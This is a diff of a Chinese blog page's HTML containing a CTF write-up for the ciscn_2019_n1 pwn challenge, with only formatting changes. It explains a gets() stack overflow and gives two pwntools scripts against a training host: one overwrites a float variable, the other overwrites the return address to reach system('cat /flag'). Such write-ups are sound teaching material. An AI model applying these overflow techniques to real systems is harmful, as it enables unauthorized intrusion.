@@ -19,12 +19,12 @@
   <meta name="author" content="野草">
   <meta name="keywords" content="野草">
   
-    <meta name="description" content="这道题有gets，可以覆盖v1的值，但是程序判断的是v2。 解法1:覆盖v2 先找到11.28125的16进制值，我们在IDA中查看。  11.28125 &#x3D; 0x41348000 查看v2和v1地址。 这里的var_30应该就是v1的头，var4就是v2的头，那么我们要填充的数据的长度就是0x30-0x4。还有一中查看方法，就是看func函数中注释的rbp。rbp保存着数组的地址，而数组的地址">
+    <meta name="description" content="这道题有gets，可以覆盖v1的值，但是程序判断的是v2。 ## 解法1:覆盖v2 先找到11.28125的16进制值，我们在IDA中查看。  11.28125 &#x3D; 0x41348000 查看v2和v1地址。  这里的var_30应该就是v1的头，var4就是v2的头，那么我们要填充的数据的长度就是0x30-0x4。还有一中查看方法，就是看func函数中注释的rbp。rbp保存着数组的地">
 <meta property="og:type" content="website">
 <meta property="og:title" content="csin2019n1">
 <meta property="og:url" content="https://ycqaq233.github.io/WriteUp/PWN/csin2019n1.html">
 <meta property="og:site_name" content="野草">
-<meta property="og:description" content="这道题有gets，可以覆盖v1的值，但是程序判断的是v2。 解法1:覆盖v2 先找到11.28125的16进制值，我们在IDA中查看。  11.28125 &#x3D; 0x41348000 查看v2和v1地址。 这里的var_30应该就是v1的头，var4就是v2的头，那么我们要填充的数据的长度就是0x30-0x4。还有一中查看方法，就是看func函数中注释的rbp。rbp保存着数组的地址，而数组的地址">
+<meta property="og:description" content="这道题有gets，可以覆盖v1的值，但是程序判断的是v2。 ## 解法1:覆盖v2 先找到11.28125的16进制值，我们在IDA中查看。  11.28125 &#x3D; 0x41348000 查看v2和v1地址。  这里的var_30应该就是v1的头，var4就是v2的头，那么我们要填充的数据的长度就是0x30-0x4。还有一中查看方法，就是看func函数中注释的rbp。rbp保存着数组的地">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/PWN/img/ciscn_2019_n1-1.png">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/PWN/img/ciscn_2019_n1-2.png">
@@ -227,21 +227,16 @@
                 
 
 <article class="page-content">
-  <p><img src="img/ciscn_2019_n1-1.png" srcset="/img/loading.gif" lazyload alt><br>
-这道题有gets，可以覆盖v1的值，但是程序判断的是v2。</p>
-<h2><span id="解法1覆盖v2">解法1:覆盖v2</span></h2>
-<p>先找到11.28125的16进制值，我们在IDA中查看。<br>
-<img src="img/ciscn_2019_n1-2.png" srcset="/img/loading.gif" lazyload alt><br>
-11.28125 = 0x41348000<br>
-查看v2和v1地址。<img src="img/ciscn_2019_n1-3.png" srcset="/img/loading.gif" lazyload alt><br>
-这里的var_30应该就是v1的头，var4就是v2的头，那么我们要填充的数据的长度就是0x30-0x4。还有一中查看方法，就是看func函数中注释的rbp。rbp保存着数组的地址，而数组的地址就是数组第一个数据的地址。由于v1和v2是连续存储的，所以只需要将两者的rbp相减就行。v1是-30h,v2是-4h，所以要填充的长度就是0x30-0x4。得到exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26400</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x41348000</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-<p>连接得到flag</p>
-<h2><span id="解法2利用systemcat-flag">解法2:利用system(“cat /flag”)</span></h2>
-<p>在汇编界面按空格到文本界面。<img src="img/ciscn_2019_n1-4.png" srcset="/img/loading.gif" lazyload alt><br>
-跟网上的又不一样，我还找了半天。这里可以看到右边的cat /flag，这一行就是我们目标函数的地址。所以我们覆盖掉v1的ret使其跳转到目标函数的地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26400</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x4006BE</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-<p>成功。</p>
+  <p><img src="img/ciscn_2019_n1-1.png" srcset="/img/loading.gif" lazyload>
+这道题有gets，可以覆盖v1的值，但是程序判断的是v2。 ## 解法1:覆盖v2
+先找到11.28125的16进制值，我们在IDA中查看。 <img src="img/ciscn_2019_n1-2.png" srcset="/img/loading.gif" lazyload> 11.28125 = 0x41348000 查看v2和v1地址。
+<img src="img/ciscn_2019_n1-3.png" srcset="/img/loading.gif" lazyload>
+这里的var_30应该就是v1的头，var4就是v2的头，那么我们要填充的数据的长度就是0x30-0x4。还有一中查看方法，就是看func函数中注释的rbp。rbp保存着数组的地址，而数组的地址就是数组第一个数据的地址。由于v1和v2是连续存储的，所以只需要将两者的rbp相减就行。v1是-30h,v2是-4h，所以要填充的长度就是0x30-0x4。
+得到exp: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26400</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x41348000</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure> 连接得到flag ## 解法2:利用system("cat /flag")
+在汇编界面按空格到文本界面。 <img src="img/ciscn_2019_n1-4.png" srcset="/img/loading.gif" lazyload>
+跟网上的又不一样，我还找了半天。这里可以看到右边的cat
+/flag，这一行就是我们目标函数的地址。
+所以我们覆盖掉v1的ret使其跳转到目标函数的地址。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26400</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x4006BE</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure> 成功。</p>
 
 
   
